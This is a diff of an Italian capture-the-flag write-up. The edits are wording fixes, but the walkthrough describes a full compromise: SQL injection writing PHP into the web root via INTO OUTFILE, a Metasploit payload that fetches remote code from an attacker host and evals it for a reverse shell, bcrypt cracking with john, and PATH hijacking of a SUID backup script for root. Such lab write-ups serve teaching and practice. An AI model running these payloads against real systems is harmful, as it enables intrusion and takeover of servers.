@@ -60,7 +60,7 @@ Si può notare che questa injection è categorizzabile come remota, senza autent
 
 Per capire dove sfruttare il cookie di sessione è opportuno scansionare le directory del web server in cerca di aree riservate agli amministratori. Per fare ciò si può usare dirb, un fuzzing tool che, dato un dizionario di nomi di file e directory comuni, invia richieste al server con tali nomi in modo da trovare risorse non puntate direttamente da dei link.
 
-Tra le varie directory trovate, risalta quella ```/_admin```. Visitandola, si apre una pagina con dei link a delle subdirectory. Visitando il link alla directory ```dist/```, si accede a un pannello di login per l'area amministrativa. 
+Tra i le varie directory trovate, risalta quella ```/_admin```. Visitandola, si apre una pagina con dei link a delle subdirectory. Visitando il link alla directory ```dist/```, si accede a un pannello di login per l'area amministrativa. 
 
 Non essendo in possesso di credenziali, si può impersonare l'amministratore del webserver usando il cookie di sessione ottenuto al passo precedente. Per intercettare e modificare la richiesta in uscita dal browser è stato scelto di usare il proxy burp.
 
@@ -74,15 +74,15 @@ Valorizzando opportunamente il campo ```Cookie``` e inoltrando la richiesta, si 
 
 In SQL è possibile scrivere l'output di una query in un file specificato: ammesso che l'utente del database abbia i privilegi necessari, è possibile farlo anche all'interno del webserver. Si può dunque tentare di effettuare injection di codice tramite la query SQL. La query test, con payload php, è la seguente:
 
-```php
-SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/phpinfo.php'
+```SQL
+SELECT "<?php phpinfo(); ?>" INTO OUTFILE '/var/www/html/phpinfo.php'
 ```
 
 Il comando ```SELECT``` genera come output il codice nel payload, ```INTO OUTFILE``` invece scrive tale output nel file specificato di seguito. Il path ```/var/www/html/phpinfo.php``` è tra quelli di default più comuni usati dai webserver. Quando aperto su browser, il codice viene eseguito. La funzione ```phpinfo()``` restituisce informazioni sul webserver. 
 
 Il fatto che la pagina generata dal file ```phpinfo.php``` risulta visitabile indica che l'injection è andata a buon fine.
 
-Per sfruttare questa vulnerabilità al meglio, il payload php della SQL injection può essere sostituito con uno che genera una reverse shell sul webserver, in modo da ottenere accesso persistente alla macchina obiettivo. Tale payload può essere facilmente generato usando meterpreter, parte del framework Metasploit.
+Per sfruttare questa vulnerabilità al meglio, il payload php della SQL injection può essere sostituito con uno che genera una reverse shell sul webserver, in modo da ottenere accesso alla macchina obiettivo. Tale payload può essere facilmente generato usando meterpreter, parte del framework Metasploit.
 
 I comandi e parametri per la creazione del payload sono i seguenti:
 
@@ -97,7 +97,7 @@ sudo msfconsole
    run
 ```
 
-dove LHOST e LPORT sono rispettivamente indirizzo ip e porta su cui sta in ascolto la macchina attaccante per comunicare con la reverse shell, SRVPORT invece è la porta usata dal server Metasploit per servire il payload meterpreter. Le porte usate sono quelle usate più comunemente, in modo da evitare l'interferenza di firewall.
+dove LHOST e LPORT sono rispettivamente indirizzo ip e porta su cui sta in ascolto la macchina attaccante, SRVPORT invece è la porta usata dal server Metasploit per servire il payload meterpreter. Le porte usate sono quelle più comuni, in modo da evitare l'interferenza di firewall.
 
 Il payload generato è il seguente:
 
@@ -108,7 +108,7 @@ php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.56.1:443/
 Inserendo la porzione tra virgolette in una query SQL, si ottiene il codice da iniettare nel form:
 
 ```php
-SELECT '<?php eval(file_get_contents('http://192.168.56.1:443/QDtxspMboNPbjD', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]))); ?>' INTO OUTFILE '/var/www/html/shell.php'
+SELECT "<?php eval(file_get_contents('http://192.168.56.1:443/QDtxspMboNPbjD', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]))); ?>" INTO OUTFILE '/var/www/html/shell.php'
 ```
 
 
@@ -161,9 +161,9 @@ john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt /home/matteo/Dow
 
 dove sono specificati il formato dell'hash, la wordlist da usare e il file contentente il singolo hash da forzare. 
 
-La password risulta essere **delta1** e, tendando l'accesso, si rivela essere la stessa dell'account locale . In ```/home/moneyrabber``` si trova il secondo flag.
+La password risulta essere **delta1** e, tendando l'accesso, si rivela essere la stessa dell'account locale. In ```/home/moneyrabber``` si trova il secondo flag.
 
-Nella home di moneybgrabber è presente anche il file ```backup.sh```:
+Nella home di moneybgrabber è presente anche il file ```backup.sh```, il cui proprietario è root:
 
 ```bash
 #!/bin/bash
@@ -181,7 +181,7 @@ Il contenuto di ```$PATH``` è sovrascrivibile con il comando seguente:
 export PATH=/tmp:/home/moneygrabber/.local/bin:/home/moneygrabber/bin:/usr/local/bin:/usr/bin
 ```
 
-dove la prima directory è quella scelta per contenere l'eseguibile malevolo, creato con i seguentu comandi:
+dove la prima directory è quella scelta per contenere l'eseguibile malevolo, generabile con i seguenti comandi:
 
 ```
 cd /tmp
@@ -189,7 +189,7 @@ echo "/bin/bash" > tar
 chmod +x tar
 ```
 
-Per generare una shell con privilegi root, è necessario eseguire ```backup.sh``` con i medesimi privilegi. Non conoscendo la password per l'account root, servirebbe che su ```backup.sh``` fosse impostato il bit SUID che in Linux permette di lanciarelo script con privilegi del possessore, in questo caso root. 
+Per generare una shell con privilegi root, è necessario eseguire ```backup.sh``` con i medesimi privilegi. Non conoscendo la password, servirebbe che su ```backup.sh``` fosse impostato il bit SUID che permetterebbe di lanciare lo script con privilegi di root, in quanto proprietario del file.
 
 Si procede dunque trovando tutti gli eseguibili con impostato il bit SUID per poi individuarne uno che chiama lo script ```backup.sh``` e lanciarlo. Il comando per listare gli eseguibili di interesse è il seguente:
 
@@ -197,7 +197,7 @@ Si procede dunque trovando tutti gli eseguibili con impostato il bit SUID per po
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Nell'output compare l'eseguibile ```/usr/bin/backup```. Per vederne il contenuto si può usare il comando ```strings```, che restituisce stringhe di caratteri da file non di testo. Si vede che ```backup.sh``` viene chiamato da ```backup```.
+Nell'output compare l'eseguibile ```/usr/bin/backup```. Per vederne il contenuto si può usare il comando ```strings```, che restituisce stringhe di caratteri da file non di testo. Si vede che ```backup.sh``` viene chiamato in ```backup```.
 
 <p align="center">
 <img src="images/strings1.png" width=50%/>
